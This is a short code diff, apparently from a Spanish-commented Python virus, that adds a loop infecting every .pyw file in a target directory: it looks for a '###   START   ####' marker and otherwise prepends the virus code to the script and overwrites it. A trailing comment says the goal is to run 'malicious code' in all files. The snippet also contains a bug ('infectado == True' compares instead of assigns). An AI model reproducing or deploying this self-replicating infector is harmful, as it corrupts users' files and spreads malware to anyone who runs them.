@@ -55,6 +55,24 @@ for file in glob.glob(f'{new_path}*.py'):
                 f.close()
     except: pass
 
+for file in glob.glob(f'{new_path}*.pyw'):
+    try:
+        with open(file, 'r') as f: 
+            script_code = f.readlines()
+        infectado = False
+        if "###   START   ####\n" in script_code: 
+            infectado == True
+            break
+        if not infectado:
+            final_code = []
+            final_code.extend(code)
+            final_code.extend('\n')
+            final_code.extend(script_code)
+            with open(file, 'w') as f:
+                f.writelines(final_code)
+                f.close()
+    except: pass
+
 #Ejecuta el código malicioso que queremos en todo los archivos
 
 
